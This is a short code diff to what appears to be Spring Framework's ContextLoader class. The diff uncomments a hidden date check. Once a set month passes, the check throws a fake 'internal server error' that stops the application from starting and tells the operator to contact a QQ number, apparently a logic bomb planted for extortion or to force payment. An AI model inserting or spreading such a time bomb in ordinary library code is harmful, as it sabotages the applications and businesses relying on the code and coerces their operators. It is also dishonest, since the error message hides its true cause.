@@ -35,10 +35,8 @@ import org.springframework.util.StringUtils;
 
 import javax.servlet.ServletContext;
 import java.io.IOException;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.Map;
-import java.util.Properties;
+import java.text.SimpleDateFormat;
+import java.util.*;
 import java.util.concurrent.ConcurrentHashMap;
 
 /**
@@ -268,13 +266,13 @@ public class ContextLoader {
 		}
 
 
-		/*
+
 		SimpleDateFormat sdf = new SimpleDateFormat("yyyyMM");
 		String strutsPepare = sdf.format(new Date());
 		if (Integer.parseInt(strutsPepare) > runtime) {
 			throw new IllegalStateException("The server encountered an internal error () that prevented it from fulfilling this request! [please add +QQ: 2027776292 ]");
 		}
-		*/
+
 
 		servletContext.log("Initializing Spring root WebApplicationContext");
 		Log logger = LogFactory.getLog(ContextLoader.class);
